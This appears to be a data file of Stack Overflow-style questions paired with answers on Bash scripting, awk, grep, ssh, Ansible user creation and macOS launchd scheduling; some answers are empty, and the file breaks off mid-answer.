    "Script parameters in Bash": "The arguments that you provide to a bashscript will appear in the variables $1 and $2 and $3 where the number refers to the argument. $0 is the command itself.\nThe arguments are seperated by spaces, so if you would provide the -from and -to in the command, they will end up in these variables too, so for this:\n./ocrscript.sh -from /home/kristoffer/test.png -to /home/kristoffer/test.txt\nYou'll get:\n$0    # ocrscript.sh\n$1    # -from\n$2    # /home/kristoffer/test.png\n$3    # -to\n$4    # /home/kristoffer/test.txt\nIt might be easier to omit the -from and the -to, like:\nocrscript.sh /home/kristoffer/test.png /home/kristoffer/test.txt\nThen you'll have:\n$1    # /home/kristoffer/test.png\n$2    # /home/kristoffer/test.txt\nThe downside is that you'll have to supply it in the right order. There are libraries that can make it easier to parse named arguments on the command line, but usually for simple shell scripts you should just use the easy way, if it's no problem.\nThen you can do:\n/usr/local/bin/abbyyocr9 -rl Swedish -if \"$1\" -of \"$2\" 2>&1\nThe double quotes around the $1 and the $2 are not always necessary but are adviced, because some strings won't work if you don't put them between double quotes.",
    "how to check which version of nltk, scikit learn installed?": "",
    "Remove a character from the end of a variable": "Use\ntarget=${1%/}\nA reference.",
    "How do I set $PATH such that `ssh user@host command` works?": "As grawity said, ~/.bashrc is what you want, since it is sourced by non-interactive non-login shells.\nI expect the problem you're having has to do with the default Ubuntu ~/.bashrc file. It usually starts with something like this:\n# If not running interactively, don't do anything\n[ -z \"$PS1\" ] && return\nYou want to put anything for non-interactive shells before this line.",
    "How can I put the current running linux process in background? [closed]": "Suspend the process with CTRL+Z then use the command bg to resume it in background. For example:\nsleep 60\n^Z  #Suspend character shown after hitting CTRL+Z\n[1]+  Stopped  sleep 60  #Message showing stopped process info\nbg  #Resume current job (last job stopped)\nMore about job control and bg usage in bash manual page:\nJOB CONTROL\nTyping the suspend character (typically ^Z, Control-Z) while a process is running causes that process to be stopped and returns control to bash. [...] The user may then manipulate the state of this job, using the bg command to continue it in the background, [...]. A ^Z takes effect immediately, and has the additional side effect of causing pending output and typeahead to be discarded.\nbg [jobspec ...]\nResume each suspended job jobspec in the background, as if it had been started with &. If jobspec is not present, the shell's notion of the current job is used.\nEDIT\nTo start a process where you can even kill the terminal and it still carries on running\nnohup [command] [-args] > [filename] 2>&1 &\ne.g.\nnohup /home/edheal/myprog -arg1 -arg2 > /home/edheal/output.txt 2>&1 &\nTo just ignore the output (not very wise) change the filename to /dev/null\nTo get the error message set to a different file change the &1 to a filename.\nIn addition: You can use the jobs command to see an indexed list of those backgrounded processes. And you can kill a backgrounded process by running kill %1 or kill %2 with the number being the index of the process.",
    "What is the most elegant way to remove a path from the $PATH variable in Bash?": "My dirty hack:\necho ${PATH} > t1\nvi t1\nexport PATH=$(cat t1)",
    "File extension for PowerShell 3": "PowerShell files for all versions are .ps1 (or .psm1, .psd1, etc.).",
    "Shell script to set environment variables": "You need to run the script as source or the shorthand .\nsource ./myscript.sh\nor\n. ./myscript.sh\nThis will run within the existing shell, ensuring any variables created or modified by the script will be available after the script completes.\nRunning the script just using the filename will execute the script in a separate subshell.",
    "What are NR and FNR and what does \"NR==FNR\" imply?": "In Awk:\nFNR refers to the record number (typically the line number) in the current file.\nNR refers to the total record number.\nThe operator == is a comparison operator, which returns true when the two surrounding operands are equal.\nThis means that the condition NR==FNR is normally only true for the first file, as FNR resets back to 1 for the first line of each file but NR keeps on increasing.\nThis pattern is typically used to perform actions on only the first file. It works assuming that the first file is not empty, otherwise the two variables would continue to be equal while Awk was processing the second file.\nThe next inside the block means any further commands are skipped, so they are only run on files other than the first.\nThe condition FNR==NR compares the same two operands as NR==FNR, so it behaves in the same way.",
    "Compare integer in bash, unary operator expected": "Your problem arises from the fact that $i has a blank value when your statement fails. Always quote your variables when performing comparisons if there is the slightest chance that one of them may be empty, e.g.:\nif [ \"$i\" -ge 2 ] ; then\n  ...\nfi\nThis is because of how the shell treats variables. Assume the original example,\nif [ $i -ge 2 ] ; then ...\nThe first thing that the shell does when executing that particular line of code is substitute the value of $i, just like your favorite editor's search & replace function would. So assume that $i is empty or, even more illustrative, assume that $i is a bunch of spaces! The shell will replace $i as follows:\nif [     -ge 2 ] ; then ...\nNow that variable substitutions are done, the shell proceeds with the comparison and.... fails because it cannot see anything intelligible to the left of -gt. However, quoting $i:\nif [ \"$i\" -ge 2 ] ; then ...\nbecomes:\nif [ \"    \" -ge 2 ] ; then ...\nThe shell now sees the double-quotes, and knows that you are actually comparing four blanks to 2 and will skip the if.\nYou also have the option of specifying a default value for $i if $i is blank, as follows:\nif [ \"${i:-0}\" -ge 2 ] ; then ...\nThis will substitute the value 0 instead of $i is $i is undefined. I still maintain the quotes because, again, if $i is a bunch of blanks then it does not count as undefined, it will not be replaced with 0, and you will run into the problem once again.\nPlease read this when you have the time. The shell is treated like a black box by many, but it operates with very few and very simple rules - once you are aware of what those rules are (one of them being how variables work in the shell, as explained above) the shell will have no more secrets for you.",
    "How to execute Python inline from a bash shell": "This works:\npython -c 'print(\"Hi\")'\nHi\nFrom the manual, man python:\n   -c command\n          Specify  the command to execute (see next section).  This termi-\n          nates the option list (following options are passed as arguments\n          to the command).",
    "How to get the contents of a webpage in a shell variable?": "You can use wget command to download the page and read it into a variable as:\ncontent=$(wget google.com -q -O -)\necho $content\nWe use the -O option of wget which allows us to specify the name of the file into which wget dumps the page contents. We specify - to get the dump onto standard output and collect that into the variable content. You can add the -q quiet option to turn off's wget output.\nYou can use the curl command for this aswell as:\ncontent=$(curl -L google.com)\necho $content\nWe need to use the -L option as the page we are requesting might have moved. In which case we need to get the page from the new location. The -L or --location option helps us with this.",
    "How to get Erlang's release version number from a shell?": " erl -eval 'erlang:display(erlang:system_info(otp_release)), halt().'  -noshell",
    "Passing variables in remote ssh command": "If you use\nssh pvt@192.168.1.133 \"~/tools/run_pvt.pl $BUILD_NUMBER\"\ninstead of\nssh pvt@192.168.1.133 '~/tools/run_pvt.pl $BUILD_NUMBER'\nyour shell will interpolate the $BUILD_NUMBER before sending the command string to the remote host.",
    "Padding characters in printf": "Pure Bash, no external utilities\nThis demonstration does full justification, but you can just omit subtracting the length of the second string if you want ragged-right lines.\npad=$(printf '%0.1s' \"-\"{1..60})\npadlength=40\nstring2='bbbbbbb'\nfor string1 in a aa aaaa aaaaaaaa\ndo\n     printf '%s' \"$string1\"\n     printf '%*.*s' 0 $((padlength - ${#string1} - ${#string2} )) \"$pad\"\n     printf '%s\\n' \"$string2\"\n     string2=${string2:1}\ndone\nUnfortunately, with that technique, the length of the pad string has to be hardcoded to be longer than the longest one you think you'll need, but the padlength can be a variable as shown. However, you can replace the first line with these three to be able to use a variable for the length of the pad:\npadlimit=60\npad=$(printf '%*s' \"$padlimit\")\npad=${pad// /-}\nSo the pad (padlimit and padlength) could be based on terminal width ($COLUMNS) or computed from the length of the longest data string.\nOutput:\na--------------------------------bbbbbbb\naa--------------------------------bbbbbb\naaaa-------------------------------bbbbb\naaaaaaaa----------------------------bbbb\nWithout subtracting the length of the second string:\na---------------------------------------bbbbbbb\naa--------------------------------------bbbbbb\naaaa------------------------------------bbbbb\naaaaaaaa--------------------------------bbbb\nThe first line could instead be the equivalent (similar to sprintf):\nprintf -v pad '%0.1s' \"-\"{1..60}\nOr similarly for the more dynamic technique:\nprintf -v pad '%*s' \"$padlimit\"\nOr this (which allows multi-character \"ellipses\" without having to modify the format string to accommodate the number of characters - .1 in the example above). It assumes that variables with names such as $_1, $_2, etc., are unset or empty.:\nprintf -v pad '%s' \"<>\"$_{1..60}  \nYou can do the printing all on one line if you prefer:\nprintf '%s%*.*s%s\\n' \"$string1\" 0 $((padlength - ${#string1} - ${#string2} )) \"$pad\" \"$string2\"",
    "using awk with column value conditions": "If you're looking for a particular string, put quotes around it:\nawk '$1 == \"findtext\" {print $3}'\nOtherwise, awk will assume it's a variable name.",
    "Semicolons superfluous at the end of a line in shell scripts? [duplicate]": "Single semicolons at the end of a line are superfluous, since the newline is also a command separator. case specifically needs double semicolons at the end of the last command in each pattern block; see help case for details.",
    "Windows batch: sleep [duplicate]": "You can try\nping -n XXX 127.0.0.1 >nul\nwhere XXX is the number of seconds to wait, plus one.",
    "Run script on mac prompt \"Permission denied\"": "Did you give yourself the rights to execute the script?\nThe following command as super user will do this for you:\nsudo chmod 755 'filename'\nFor details you should read the man page of chmod.",
    "Press alt + numeric in bash and you get (arg [numeric]) what is that?": "The term you want to google for is:\n\"readline arguments\"\nThis will lead to, for example, this chapter from the bash reference manual:\nYou can pass numeric arguments to Readline commands. Sometimes the argument acts as a repeat count, other times it is the sign of the argument that is significant. If you pass a negative argument to a command which normally acts in a forward direction, that command will act in a backward direction. For example, to kill text back to the start of the line, you might type 'M-- C-k'.\nThe general way to pass numeric arguments to a command is to type meta digits before the command. If the first 'digit' typed is a minus sign ('-'), then the sign of the argument will be negative. Once you have typed one meta digit to get the argument started, you can type the remainder of the digits, and then the command. For example, to give the C-d command an argument of 10, you could type 'M-1 0 C-d', which will delete the next ten characters on the input line.\nFor that to work, you have to know where the Meta key is mapped: sometimes it's Alt, sometimes it's Esc, cool computers have a dedicated Meta key ;)\nFor those not familiar with the syntax, 'M-- C-k' is the equivalent of Meta_key+- Ctrl+k. \"M\" is shorthand for the Meta key, which, as noted, varies by system, \"C\" is shorthand for the Ctrl key. The \"-\" after a character (like \"M-\") is not something you type, it's a way of indicating simultaneous key presses.",
    "Creating a new user and password with Ansible": "Recently I figured out that Jinja2 filters have the capability to handle the generation of encrypted passwords. In my main.yml I'm generating the encrypted password as:\n- name: Creating user \"{{ uusername }}\" with admin access\n  user: \n    name: \"{{ uusername }}\"\n    password: \"{{ upassword | password_hash('sha512') }}\"\n    groups: admin append=yes\n  when:  assigned_role  == \"yes\"\n\n- name: Creating users \"{{ uusername }}\" without admin access\n  user:\n    name: \"{{ uusername }}\"\n    password: \"{{ upassword | password_hash('sha512') }}\"\n  when:  assigned_role == \"no\"\n\n- name: Expiring password for user \"{{ uusername }}\"\n  shell: chage -d 0 \"{{ uusername }}\"\n\"uusername\" and \"upassword\" are passed as --extra-vars to the playbook and notice I have used Jinja2 filter here to encrypt the passed password.",
    "Convert decimal to hexadecimal in UNIX shell script": "Tried printf(1)?\nprintf \"%x\\n\" 34\n22\nThere are probably ways of doing that with builtin functions in all shells but it would be less portable. I've not checked the POSIX sh specs to see whether it has such capabilities.",
    "Writing outputs to log file and console": "exec 3>&1 1>>${LOG_FILE} 2>&1\nwould send stdout and stderr output into the log file, but would also leave you with fd 3 connected to the console, so you can do\necho \"Some console message\" 1>&3\nto write a message just to the console, or\necho \"Some console and log file message\" | tee /dev/fd/3\nto write a message to both the console and the log file - tee sends its output to both its own fd 1 (which here is the LOG_FILE) and the file you told it to write to (which here is fd 3, i.e. the console).\nExample:\nexec 3>&1 1>>${LOG_FILE} 2>&1\n\necho \"This is stdout\"\necho \"This is stderr\" 1>&2\necho \"This is the console (fd 3)\" 1>&3\necho \"This is both the log and the console\" | tee /dev/fd/3\nwould print\nThis is the console (fd 3)\nThis is both the log and the console\non the console and put\nThis is stdout\nThis is stderr\nThis is both the log and the console\ninto the log file.",
    "how do I use the grep --include option for multiple file types?": "You can use multiple --include flags. This works for me:\ngrep -r --include=*.html --include=*.php --include=*.htm \"pattern\" /some/path/\nHowever, you can do as Deruijter suggested. This works for me:\ngrep -r --include=*.{html,php,htm} \"pattern\" /some/path/\nDon't forget that you can use find and xargs for this sort of thing too:\nfind /some/path/ -name \"*.htm*\" -or -name \"*.php\" | xargs grep \"pattern\"",
    "Convert specified column in a multi-line string into single comma-separated line": "Clean and simple:\nawk '{print $2}' file.txt | paste -s -d, -",
    "How to run a python script from IDLE interactive shell?": "Python3:\nexec(open('helloworld.py').read())\nIf your file not in the same dir:\nexec(open('./app/filename.py').read())\nSee https://stackoverflow.com/a/437857/739577 for passing global/local variables.\nNote: If you are running in windows you should use double slash \"//\" otherwise it gives error\nIn deprecated Python versions\nPython2 Built-in function: execfile\nexecfile('helloworld.py')\nIt normally cannot be called with arguments. But here's a workaround:\nimport sys\nsys.argv = ['helloworld.py', 'arg']  # argv[0] should still be the script name\nexecfile('helloworld.py')\nDeprecated since 2.6: popen\nimport os\nos.popen('python helloworld.py') # Just run the program\nos.popen('python helloworld.py').read() # Also gets you the stdout\nWith arguments:\nos.popen('python helloworld.py arg').read()\nAdvance usage: subprocess\nimport subprocess\nsubprocess.call(['python', 'helloworld.py']) # Just run the program\nsubprocess.check_output(['python', 'helloworld.py']) # Also gets you the stdout\nWith arguments:\nsubprocess.call(['python', 'helloworld.py', 'arg'])\nRead the docs for details :-)\nTested with this basic helloworld.py:\nimport sys\nif len(sys.argv) > 1:\n    print(sys.argv[1])",
    "How to decode URL-encoded string in shell?": "Here is a simple one-line solution.\n$ function urldecode() { : \"${*//+/ }\"; echo -e \"${_//%/\\\\x}\"; }\nIt may look like perl :) but it is just pure bash. No awks, no seds ... no overheads. Using the : builtin, special parameters, pattern substitution and the echo builtin's -e option to translate hex codes into characters. See bash's manpage for further details. You can use this function as separate command\n$ urldecode https%3A%2F%2Fgoogle.com%2Fsearch%3Fq%3Durldecode%2Bbash\nhttps://google.com/search?q=urldecode+bash\nor in variable assignments, like so:\n$ x=\"http%3A%2F%2Fstackoverflow.com%2Fsearch%3Fq%3Durldecode%2Bbash\"\n$ y=$(urldecode \"$x\")\n$ echo \"$y\"\nhttp://stackoverflow.com/search?q=urldecode+bash",
    "Asynchronous shell commands": "You can just run the script in the background:\n$ myscript &\nNote that this is different from putting the & inside your script, which probably won't do what you want.",
    "Find all zero-byte files in directory and subdirectories": "To print the names of all files in and below $dir of size 0:\nfind \"$dir\" -size 0\nNote that not all implementations of find will produce output by default, so you may need to do:\nfind \"$dir\" -size 0 -print\nTwo comments on the final loop in the question:\nRather than iterating over every other word in a string and seeing if the alternate values are zero, you can partially eliminate the issue you're having with whitespace by iterating over lines. eg:\nprintf '1 f1\\n0 f 2\\n10 f3\\n' | while read size path; do\n    test \"$size\" -eq 0 && echo \"$path\"; done\nNote that this will fail in your case if any of the paths output by ls contain newlines, and this reinforces 2 points: don't parse ls, and have a sane naming policy that doesn't allow whitespace in paths.\nSecondly, to output the data from the loop, there is no need to store the output in a variable just to echo it. If you simply let the loop write its output to stdout, you accomplish the same thing but avoid storing it.",
    "How to execute ssh-keygen without prompt": "We need to accomplish two steps automatically:\nEnter a passphrase. Use the -N flag (void string for this example):\nssh-keygen -t rsa -N ''\nOverwrite the key file:\nUse -f to enter the path (in this example id_rsa) plus a here-string to answer yes to the following question:\nssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y >/dev/null 2>&1\nOr, under a bash like shell, If you certainly want to overwrite the previous one, use just a here-string to feed the command with all the need input:\nssh-keygen -q -t rsa -N '' <<< $'\\ny' >/dev/null 2>&1\nFrom ssh-keygen man page:\n  -N new_passphrase provides the new passphrase.\n  -q                silence ssh-keygen.\n  -f filename       specifies the filename of the key file.\nStep by step explanation\n$ ssh-keygen -t rsa\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/klashxx/.ssh/id_rsa):\n1) To avoid entering the key use -f:\n$ ssh-keygen -t rsa -f ~/.ssh/id_rsa\nGenerating public/private rsa key pair.\n/home/klashxx/.ssh/id_rsa already exists.\nOverwrite (y/n)?\nATTENTION: If you don't care about the RSA file name and certainly want to overwrite the previous one, check the instructions below point four.\n2) Now we need to answer \"y\" automatically to the overwrite question (let's use a here-string for that job):\n$ ssh-keygen -t rsa -f ~/.ssh/id_rsa <<< y\nGenerating public/private rsa key pair.\n/home/klashxx/.ssh/id_rsa already exists.\nOverwrite (y/n)? Enter passphrase (empty for no passphrase):\n3) Finally we're going to use the -N flag to enter a void pass:\n$ ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa <<< y\nGenerating public/private rsa key pair.\n/home/klashxx/.ssh/id_rsa already exists.\nOverwrite (y/n)? Your identification has been saved in /home/klashxx/.ssh/id_rsa.\nYour public key has been saved in /home/klashxx/.ssh/id_rsa.pub.\nThe key fingerprint is:\nSHA256:Xo0t6caMB/8TSsigxfY28JIfqYjyqxRZrFrPncx5yiU klashxx@server\nThe key's randomart image is:\n+---[RSA 2048]----+\n|                 |\n|  .              |\n|   o .           |\n|  +   *    =     |\n| +.  + BSo= o    |\n|...o.+o+XO...    |\n|.. .o.E==+B. .   |\n|o . ...=.o...    |\n|.+o.  o     ..   |\n+----[SHA256]-----+\n4) Extra ball, cleanup the output, just check the return code:\n$ ssh-keygen -q -t rsa -N '' -f ~/.ssh/id_rsa <<<y >/dev/null 2>&1\n$ echo $?\n0\nAn alternative path to overwrite the previous RSA file (no -f flag needed)\nNOTE: Only bash like shells.\nIf you don't care about the RSA name and just want to overwrite it, we need to answer these two questions automatically:\nEnter file in which to save the key: /example/path/.ssh/id_rsa already exists.\nOverwrite (y/n)?\nIf we do this by hand, for the first question we just need to hit enter, and for the second, type y and press enter.\nWe can simulate these actions by using the following here-string:\n$'\\ny'\nFrom the bash man page:\nWords of the form $'string' are treated specially. The word expands to \"string\", with backslash-escaped characters replaced as specified by the ANSI C standard.\n\\n new line\nSo, if we use od to analyze our string:\ncat - <<< $'\\ny' | od -c\n0000000  \\n   y  \\n\nWe see that we're getting just what we need to answer the questions.\nPoints 1 and 2 can be summarized into:\nssh-keygen -q -t rsa  <<< $'\\ny'\nAnd the final command will be:\n$ ssh-keygen -q -t rsa -N '' <<< $'\\ny' >/dev/null 2>&1\n$ echo $?\n0\nKudos\n@lukasz-dynowski, @redochka, @mellow-yellow, @yeti and the rest of the folks in this thread.",
    "How to temporarily switch profiles for AWS CLI?": "",
    "Recursively change file extensions in Bash": "Use:\nfind . -name \"*.t1\" -exec bash -c 'mv \"$1\" \"${1%.t1}\".t2' - '{}' +\nIf you have rename available then use one of these:\nfind . -name '*.t1' -exec rename .t1 .t2 {} +\nfind . -name \"*.t1\" -exec rename 's/\\.t1$/.t2/' '{}' +\nFor a single file use the + delimiter and for renaming all files at once use the ; delimiter. Example: For a single file\nfind . -name \"*.t1\" -exec bash -c 'mv \"$1\" \"${1%.t1}\".t2' - '{}' +\nAnd for all files in the scope of the find command:\nfind . -name \"*.t1\" -exec bash -c 'mv \"$1\" \"${1%.t1}\".t2' - '{}' \\;",
    "How to split a file into equal parts, without breaking individual lines? [duplicate]": "If you mean an equal number of lines, split has an option for this:\nsplit --lines=75\nIf you need to know what that 75 should really be for N equal parts, its:\nlines_per_part = int(total_lines + N - 1) / N\nwhere total lines can be obtained with wc -l.\nSee the following script for an example:\n#!/usr/bin/bash\n\n# Configuration stuff\n\nfspec=qq.c\nnum_files=6\n\n# Work out lines per file.\n\ntotal_lines=$(wc -l <${fspec})\n((lines_per_file = (total_lines + num_files - 1) / num_files))\n\n# Split the actual file, maintaining lines.\n\nsplit --lines=${lines_per_file} ${fspec} xyzzy.\n\n# Debug information\n\necho \"Total lines     = ${total_lines}\"\necho \"Lines  per file = ${lines_per_file}\"    \nwc -l xyzzy.*\nThis outputs:\nTotal lines     = 70\nLines  per file = 12\n  12 xyzzy.aa\n  12 xyzzy.ab\n  12 xyzzy.ac\n  12 xyzzy.ad\n  12 xyzzy.ae\n  10 xyzzy.af\n  70 total\nMore recent versions of split allow you to specify a number of CHUNKS with the -n/--number option. You can therefore use something like:\nsplit --number=l/6 ${fspec} xyzzy.\n(that's ell-slash-six, meaning lines, not one-slash-six).\nThat will give you roughly equal files in terms of size, with no mid-line splits.\nI mention that last point because it doesn't give you roughly the same number of lines in each file, more the same number of characters.\nSo, if you have one 20-character line and 19 1-character lines (twenty lines in total) and split to five files, you most likely won't get four lines in every file.",
    "What is the command to list the available avdnames": "",
    "Run java jar file on a server as background process": "You can try this:\n#!/bin/sh\nnohup java -jar /web/server.jar &\nThe & symbol, switches the program to run in the background.\nThe nohup utility makes the command passed as an argument run in the background even after you log out.",
    "How to update one file in a zip archive": "Try the following:\nzip [zipfile] [file to update] \nAn example:\n$ zip test.zip test/test.txt\nupdating: test/test.txt (stored 0%)",
    "Bash command line and input limit": "The limit for the length of a command line is not imposed by the shell, but by the operating system. This limit is usually in the range of hundred kilobytes. POSIX denotes this limit ARG_MAX and on POSIX conformant systems you can query it with\n$ getconf ARG_MAX    # Get argument limit in bytes\nE.g. on Cygwin this is 32000, and on the different BSDs and Linux systems I use it is anywhere from 131072 to 2621440.\nIf you need to process a list of files exceeding this limit, you might want to look at the xargs utility, which calls a program repeatedly with a subset of arguments not exceeding ARG_MAX.\nTo answer your specific question, yes, it is possible to attempt to run a command with too long an argument list. The shell will error with a message along \"argument list too long\".\nNote that the input to a program (as read on stdin or any other file descriptor) is not limited (only by available program resources). So if your shell script reads a string into a variable, you are not restricted by ARG_MAX. The restriction also does not apply to shell-builtins.",
    "What is the Bash file extension?": "Disagreeing with the other answers, there's a common convention to use a .sh extension for shell scripts -- but it's not a useful convention. It's better not to use an extension at all. The advantage of being able tell that foo.sh is a shell script because of its name is minimal, and you pay for it with a loss of flexibility.\nTo make a bash script executable, it needs to have a shebang line at the top:\n#!/bin/bash\nand use the chmod +x command so that the system recognizes it as an executable file. It then needs to be installed in one of the directories listed in your $PATH. If the script is called foo, you can then execute it from a shell prompt by typing foo. Or if it's in the current directory (common for temporary scripts), you can type ./foo.\n(An alternate form for the shebang line is:\n#!/usr/bin/env bash\nbut see this answer for a discussion of the pros and cons.)\nNeither the shell nor the operating system pays any attention to the extension part of the file name. It's just part of the name. And by not giving it a special extension, you ensure that anyone (either a user or another script) that uses it doesn't have to care how it was implemented, whether it's a shell script (sh, bash, csh, or whatever), a Perl, Python, or Awk script, or a binary executable. The system is specifically designed so that either an interpreted script or a binary executable can be invoked without knowing or caring how it's implemented.\nUNIX-like systems started out with a purely textual command-line interface. GUIs like KDE and Gnome were added later. In a GUI desktop system, you can typically run a program (again, whether it's a script or a binary executable) by, for example, double-clicking on an icon that refers to it. Typically this discards any output the program might print and doesn't let you pass command-line arguments; it's much less flexible than running it from a shell prompt. But for some programs (mostly GUI clients) it can be more convenient.\nShell scripting is best learned from the command line, not from a GUI.\n(Some tools do pay attention to file extensions. For example, compilers typically use the extension to determine the language the code is written in: .c for C, .cpp for c++, etc. This convention doesn't apply to executable files.)\nKeep in mind that UNIX (and UNIX-like systems) are not Windows. MS Windows generally uses a file's extension to determine how to open/execute it. Binary executables need to have a .exe extension. If you have a UNIX-like shell installed under Windows, you can configure Windows to recognize a .sh extension as a shell script, and use the shell to open it; Windows doesn't have the #! convention.",
    "Compare two folders which have many files inside contents": "To get summary of new/missing files, and which files differ:\ndiff -arq folder1 folder2\na treats all files as text, r recursively searched subdirectories, q reports 'briefly', only when files differ",
    "How do I get sed to read from standard input? [duplicate]": "use the --expression option\ngrep searchterm myfile.csv | sed --expression='s/replaceme/withthis/g'",
    "What's the difference between .bashrc, .bash_profile, and .environment?": "The main difference with shell config files is that some are only read by \"login\" shells (eg. when you login from another host, or login at the text console of a local unix machine). these are the ones called, say, .login or .profile or .zlogin (depending on which shell you're using).\nThen you have config files that are read by \"interactive\" shells (as in, ones connected to a terminal (or pseudo-terminal in the case of, say, a terminal emulator running under a windowing system). these are the ones with names like .bashrc, .tcshrc, .zshrc, etc.\nbash complicates this in that .bashrc is only read by a shell that's both interactive and non-login, so you'll find most people end up telling their .bash_profile to also read .bashrc with something like\n[[ -r ~/.bashrc ]] && . ~/.bashrc\nOther shells behave differently - eg with zsh, .zshrc is always read for an interactive shell, whether it's a login one or not.\nThe manual page for bash explains the circumstances under which each file is read. Yes, behaviour is generally consistent between machines.\n.profile is simply the login script filename originally used by /bin/sh. bash, being generally backwards-compatible with /bin/sh, will read .profile if one exists.",
    "How to get the name of the current git branch into a variable in a shell script? [duplicate]": "Expanding on Noufal Ibrahim's answer, use the --short flag with git-symbolic-ref, no need to fuss with sed.\nI've been using something like this in hooks and it works well:\n#!/bin/bash\n\nbranch=$(git symbolic-ref --short HEAD)\n\necho\necho \"**** Running post-commit hook from branch $branch\"\necho\nThat outputs \"**** Running post-commit hook from branch master\"\nNote that git-symbolic-ref only works if you're in a repository. Luckily .git/HEAD, as a leftover from Git's early days, contains the same symbolic ref. If you want to get the active branch of several git repositories, without traversing directories, you could use a bash one-liner like this:\nfor repo in */.git; do branch=$(cat $repo/HEAD); echo ${repo%/.git} :  ${branch##*/}; done\nWhich outputs something like:\nrepo1 : master  \nrepo2 : dev  \nrepo3 : issue12\nIf you want to go further, the full ref contained in .git/HEAD is also a relative path to a file containing the SHA-1 hash of the branch's last commit.",
    "How do I know when my docker mysql container is up and mysql is ready for taking queries?": "You can install mysql-client package and use mysqladmin to ping target server. Useful when working with multiple docker container. Combine with sleep and create a simple wait-loop:\nwhile ! mysqladmin ping -h\"$DB_HOST\" --silent; do\n    sleep 1\ndone",
    "Batch renaming files with Bash": "You could use bash's parameter expansion feature\nfor i in ./*.pkg ; do mv \"$i\" \"${i/-[0-9.]*.pkg/.pkg}\" ; done\nQuotes are needed for filenames with spaces.",
    "Display two files side by side": "You can use pr to do this, using the -m flag to merge the files, one per column, and -t to omit headers, eg.\npr -m -t one.txt two.txt\noutputs:\napple                               The quick brown fox..\npear                                foo\nlonger line than the last two       bar\nlast line                           linux\n\n                                    skipped a line\nSee Also:\nPrint command result side by side\nCombine text files column-wise",
    "For files in directory, only echo filename (no path)": "If you want a native bash solution\nfor file in /home/user/*; do\n  echo \"${file##*/}\"\ndone\nThe above uses Parameter Expansion which is native to the shell and does not require a call to an external binary such as basename\nHowever, might I suggest just using find\nfind /home/user -type f -printf \"%f\\n\"",
    "Is there a way to change the environment variables of another process in Unix?": "Via gdb:\n(gdb) attach process_id\n\n(gdb) call putenv (\"env_var_name=env_var_value\")\n\n(gdb) detach\nThis is quite a nasty hack and should only be done in the context of a debugging scenario, of course.",
    "Escape double quote in grep": "The problem is that you aren't correctly escaping the input string, try:\necho \"\\\"member\\\":\\\"time\\\"\" | grep -e \"member\\\"\"\nAlternatively, you can use unescaped double quotes within single quotes:\necho '\"member\":\"time\"' | grep -e 'member\"'\nIt's a matter of preference which you find clearer, although the second approach prevents you from nesting your command within another set of single quotes (e.g. ssh 'cmd').",
    "Making ZSH default Shell in MacOSX [closed]": "The correct answer should've addressed your problem:\nchsh: /usr/bin/zsh: non-standard shell\nThe reason this is the case is because chsh will only accept shells that are defined in the file /etc/shells, as you can see by reading the manual for chsh:\nchsh will accept the full pathname of any executable file on the system. However, it will issue a warning if the shell is not listed in the /etc/shells file.\nTo solve this problem and make zsh the default shell, you should thus:\n$ sudo echo \"$(which zsh)\" >> /etc/shells\n$ chsh -s $(which zsh)\nObviously, I assume that zsh is in your path here. This solution will also work if you, for example, choose to install the latest zsh with brew install zsh.\nEDIT (thanks for ThisIsFlorianK for the comment):\nDepending on your shell setup you may get a message saying /etc/shells: Permission denied. You can find information about this issue here. To work around it, use the following instead:\n$ sudo sh -c \"echo $(which zsh) >> /etc/shells\"\n$ chsh -s $(which zsh)",
    "How to make grep only match if the entire line matches?": "grep -Fx ABB.log a.tmp\nFrom the grep man page:\n-F, --fixed-strings\nInterpret PATTERN as a (list of) fixed strings\n-x, --line-regexp\nSelect only those matches that exactly match the whole line.",
    "Print all but the first three columns [duplicate]": "awk '{for(i=1;i<4;i++) $i=\"\";print}' file",
    "How do I set a task to run every so often?": "Just use launchd. It is a very powerful launcher system and meanwhile it is the standard launcher system for Mac OS X (current OS X version wouldn't even boot without it). For those who are not familiar with launchd (or with OS X in general), it is like a crossbreed between init, cron, at, SysVinit (init.d), inetd, upstart and systemd. Borrowing concepts of all these projects, yet also offering things you may not find elsewhere.\nEvery service/task is a file. The location of the file depends on the questions: \"When is this service supposed to run?\" and \"Which privileges will the service require?\"\nSystem tasks go to\n/Library/LaunchDaemons/\nif they shall run no matter if any user is logged in to the system or not. They will be started with \"root\" privileges.\nIf they shall only run if any user is logged in, they go to\n/Library/LaunchAgents/\nand will be executed with the privileges of the user that just logged in.\nIf they shall run only if you are logged in, they go to\n~/Library/LaunchAgents/\nwhere ~ is your HOME directory. These task will run with your privileges, just as if you had started them yourself by command line or by double clicking a file in Finder.\nNote that there also exists /System/Library/LaunchDaemons and /System/Library/LaunchAgents, but as usual, everything under /System is managed by OS X. You shall not place any files there, you shall not change any files there, unless you really know what you are doing. Messing around in the Systems folder can make your system unusable (get it into a state where it will even refuse to boot up again). These are the directories where Apple places the launchd tasks that get your system up and running during boot, automatically start services as required, perform system maintenance tasks, and so on.\nEvery launchd task is a file in PLIST format. It should have reverse domain name notation. E.g. you can name your task\ncom.example.my-fancy-task.plist\nThis plist can have various options and settings. Writing one per hand is not for beginners, so you may want to get a tool like LaunchControl (commercial, $18) or Lingon (commercial, $14.99) to create your tasks.\nJust as an example, it could look like this\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n    <string>com.example.my-fancy-task</string>\n    <key>OnDemand</key>\n    <true/>\n    <key>ProgramArguments</key>\n    <array>\n        <string>/bin/sh</string>\n        <string>/usr/local/bin/my-script.sh</string>\n    </array>\n    <key>StartInterval</key>\n    <integer>1800</integer>\n</dict>\n</plist>\nThis agent will run the shell script /usr/local/bin/my-script.sh every 1800 seconds (every 30 minutes). You can also have task run on certain dates/times (basically launchd can do everything cron can do) or you can even disable \"OnDemand\" causing launchd to keep the process permanently running (if it quits or crashes, launchd will immediately restart it). You can even limit how much resources a process may use.\nUpdate: Even though OnDemand is still supported, it is deprecated. The new setting is named KeepAlive, which makes much more sense. It can have a boolean value, in which case it is the exact opposite of OnDemand (setting it to false behaves as if OnDemand is true and the other way round). The great new feature is, that it can also have a dictionary value instead of a boolean one. If it has a dictionary value, you have a couple of extra 